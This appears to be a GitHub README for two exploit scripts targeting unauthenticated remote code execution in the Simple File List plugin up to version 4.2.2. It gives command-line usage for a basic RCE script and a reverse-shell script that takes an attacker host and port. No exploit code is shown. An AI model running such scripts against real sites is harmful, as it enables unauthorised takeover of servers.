# Unauthenticated Remote Code Execution in Simple File List <= 4.2.2
### Two Scripts; One for basic RCE, the other for a reverse shell

#### Usage: sfl_rce.py
```bash
python3 sfl_rce.py <target_url>
Ex: python3 sfl_rce.py http://example.com
```
![image](https://user-images.githubusercontent.com/28818635/121764667-a64fd900-cb13-11eb-9aa7-9ea92a7e5bae.png)

#### Usage: sfl_rev.py
```bash
python3 sfl_rev.py <target_url> <lhost> <lport>
Ex: python3 sfl_rev.py http://exaple.com 10.10.10.10 443
```
![image](https://user-images.githubusercontent.com/28818635/121764681-c089b700-cb13-11eb-854b-036c8d54e646.png)
